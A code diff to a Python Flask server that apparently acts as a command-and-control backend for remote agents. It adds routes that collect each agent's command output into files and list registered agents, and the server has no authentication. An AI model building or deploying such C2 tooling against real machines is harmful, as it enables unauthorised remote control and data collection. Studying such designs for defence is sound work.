@@ -2,6 +2,7 @@ from flask import Flask
 import random
 from flask import Flask, request
 import shared
+from flask import jsonify
 
 app = Flask(__name__)
 
@@ -45,7 +46,22 @@ def command(agent_guid):
     else:
         shared.delete_command()
         return cmd
+@app.route("/agent/<agent_guid>/output", methods=["POST"])
+def output(agent_guid):
+    if agent_guid not in agents:
+        return "No such agent"
+    else:
+        data = request.get_json()
 
+        with open(f"results_{agent_guid}.txt", "a") as f:
+            f.write(data["output"] + "\n")
+
+        return "OK"
+
+
+@app.route("/agent/list")
+def list_agents():
+    return jsonify(agents)
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000, debug=False)
